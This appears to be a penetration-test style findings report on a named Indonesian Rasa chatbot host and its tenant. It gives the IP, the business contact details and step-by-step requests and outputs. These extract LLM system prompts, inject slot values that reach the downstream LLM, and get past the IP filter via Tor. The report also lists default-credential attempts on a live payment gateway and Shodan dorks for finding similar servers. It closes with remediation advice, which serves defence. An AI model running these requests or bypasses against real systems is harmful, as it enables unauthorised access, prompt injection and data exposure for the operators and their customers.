# Raytech / Eyerizz Eyewear — Rasa System Prompt Leak + Exposed Infrastructure Stack

**Date:** 2026-05-23  
**Target:** 208.110.93.69  
**Org:** Raytech (raytech.id) — Indonesian chatbot SaaS operator  
**Tenant:** Eyerizz Eyewear Sanur, Bali (eyerizz.raytech.id)  
**ASN:** AS16591 — WholeSale Internet  
**Severity:** HIGH  
**Access method:** Tor (direct IP-filtered)  

---

## Context

Raytech is an Indonesian SaaS operator running managed Rasa chatbot deployments. The Rasa API is exposed on a single multi-tenant host that also runs Portainer, pgAdmin, and PostgreSQL. The origin IP is IP-filtered but reachable via Tor exit nodes.

The first signal was a raw prompt string in the `/webhooks/rest/webhook` greeting response: `#llmgreet_english|You are a friendly and helpful assistant...` — the `|` delimiter shows Rasa is dispatching raw intent + system prompt text to a downstream LLM processor without stripping it from the Rasa response layer.

---

## What Was Found

### F1 — System Prompt Disclosure via Rasa `/domain` (HIGH)

`GET /domain` with `Accept: application/json` returns the full bot schema including all `utter_*` responses. Each response embeds a raw LLM system prompt in the format `#<intent>|<prompt>`.

```
GET http://208.110.93.69:5005/domain
Accept: application/json

→ {
  "responses": {
    "utter_ask_store_info": [{
      "text": "#llmstore_english|You are a smart assistant for an Eyerizz optical and eyewear store.
               Location: Eyerizz Eyewear Sanur, Jl. Danau Tamblingan No. 15
               Phone/WhatsApp: 0811-1688-851
               [full business context prompt continues...]"
    }],
    "utter_greeting_english": [{
      "text": "#llmgreet_english|You are a friendly and helpful assistant. Your name is..."
    }]
  },
  "intents": ["ask_store_info","ask_store_info_indo","cek_order_state","cek_order_state_en",
               "cek_price","cek_price_indo","greeting_english","greeting_indo","out_of_scope"]
}
```

All system prompts are recoverable in plaintext. The `#<intent>` prefix is the inter-service dispatch token passed to a downstream LLM. That layer is not Rasa — Rasa is the intake router. The LLM backend receives the full prompt string including business context, store identity, and persona instructions.

**OWASP LLM06 — Sensitive Information Disclosure.**

### F2 — Unauthenticated Rasa REST API + Event Injection (HIGH)

Port 5005 runs Rasa 3.6.0 with no auth layer.

```
GET  /version          → {"version":"3.6.0","minimum_compatible_version":"3.5.0"}
GET  /status           → model file + active jobs
GET  /domain           → full intent/response/slot/entity schema
POST /webhooks/rest/webhook + {"sender":"<any>","message":"..."} → bot responds
GET  /conversations/<id>/tracker → full event stream for any session
POST /conversations/<id>/tracker/events → arbitrary event injection accepted
```

Slot injection verified:

```
POST /conversations/slottest/tracker/events
[{"event":"slot","name":"order_id","value":"INJECTED","timestamp":null}]

→ 200: {"sender_id":"slottest","slots":{"order_id":"INJECTED",...}}
```

Downstream execution confirmed:

```
POST /conversations/slottest/execute {"name":"utter_order_status_en"}
→ {"messages":[{"text":"#cek_order_state_en|INJECTED"}]}
```

The injected `order_id` value passes into the LLM dispatch string. Any string placed in that slot reaches the downstream LLM processor, enabling prompt injection through the Rasa tracker layer.

### F3 — Portainer CE 2.27.1 Exposed on :443 + :9000 (HIGH)

```
GET https://208.110.93.69/api/settings/public
→ {
    "LogoURL": "https://eyerizz.raytech.id/web/image?model=res.company&id=1&field=logo",
    "AuthenticationMethod": 1,
    "RequiredPasswordLength": 12
  }
```

Portainer login UI is accessible. The `/api/settings/public` response leaks the tenant's Odoo logo URL, confirming `eyerizz.raytech.id` as the active tenant. Auth is required for container management operations. CVE-2024-9014 does not apply (affects pgAdmin < 8.11; Portainer is separately managed).

### F4 — pgAdmin 4 v9.1.0 Exposed on :8080 (HIGH)

pgAdmin login UI is publicly accessible. No CVE-applicable version in the exposed path. Auth is required but the admin interface itself should not be internet-facing.

### F5 — PostgreSQL 5432 Exposed (HIGH)

```
5432/tcp open postgresql
```

Password authentication required. The Rasa tracker store backend is the likely schema. Combined with the unauth `/conversations/<id>/tracker` endpoint, two read paths to the same data exist.

### F6 — Operator Attribution: 蓝鲸支付 Payment Gateway (CONTEXT)

Cert pivot on port 443 returned a CloudFlare Origin Certificate for `*.raytech.id`. Subdomain enumeration found `app.raytech.id` hosting 蓝鲸支付 (Blue Whale Payment) — a Chinese informal Alipay/WeChat QR payment solution (Spring Boot, vmq-based).

`app.raytech.id` is on a separate CloudFlare origin from 208.110.93.69.

Key surface on `app.raytech.id`:
- `GET /createOrder` — 200, no auth; requests merchant order params + HMAC sign
- `GET /getOrder` — 200, no auth; requests orderId param
- `POST /login` — tested admin/admin, admin/123456, admin/password, admin/admin123, admin/vmq12345; all return 账号或密码不正确 (wrong credentials)
- `/admin/getMain` and `/admin/getMenu` — auth-gated (returns 未登录)

The unauth `/createOrder` + `/getOrder` surface is exposed without IP restriction. The HMAC sign requirement prevents unauthorized order creation. The `orderId` parameter is not a sequential integer; no IDOR confirmed.

Legal disclaimer on the page: "仅供交流学习使用，请勿用于商业用途" (for communication/learning only, not commercial use). A non-commercial payment gateway is processing live Alipay/WeChat traffic.

---

## Infrastructure Map

```
208.110.93.69 (AS16591 — WholeSale Internet)
├── :22    SSH
├── :80    nginx (redirect to HTTPS)
├── :443   Portainer CE 2.27.1 (nginx TLS frontend)
│            └── CF Origin Cert: *.raytech.id
├── :5005  Rasa 3.6.0 (unauthenticated)
├── :8080  pgAdmin 4 v9.1.0
├── :9000  Portainer CE 2.27.1 (direct)
└── :5432  PostgreSQL

eyerizz.raytech.id → Odoo ERP/e-commerce (Eyerizz tenant)
drinktime.raytech.id → 502 Bad Gateway (defunct)
app.raytech.id → 蓝鲸支付 (separate CF origin)
```

---

## Chain

1. `/domain` leaks full system prompts for all bot personas (F1)
2. Unauth `/conversations/<id>/tracker/events` injects arbitrary slots (F2)
3. Injected slots pass through Rasa's `execute` endpoint into the LLM dispatch string (F2)
4. Portainer leaks tenant identity via `/api/settings/public` (F3)
5. PostgreSQL and pgAdmin provide two additional paths to tracker store data (F4, F5)

---

## Access Bypass

The host IP-filters inbound connections. All probes confirmed via Tor (`proxychains4 -q`). The filter does not cover Tor exit node ranges.

---

## Shodan Dorks Used

```
Rasa survey pop: port:5005 /webhooks/rest/webhook
Rasa title: title:"Rasa Server"
```

---

## Remediation

| Finding | Fix |
|---------|-----|
| Rasa API unauthenticated | Add `--auth-token` flag or nginx `Authorization` header check in front of :5005 |
| System prompts in `/domain` | Move LLM system prompts out of Rasa response templates; pass via secure env var to backend |
| Slot injection | Sanitize all slot values before passing to downstream LLM; validate at the dispatch layer |
| Portainer on internet | Restrict :443/:9000 to management CIDR or VPN only |
| pgAdmin on internet | Same — management UI behind VPN or firewall rule |
| PostgreSQL on internet | Bind to localhost or internal interface; no reason for :5432 to be internet-routable |
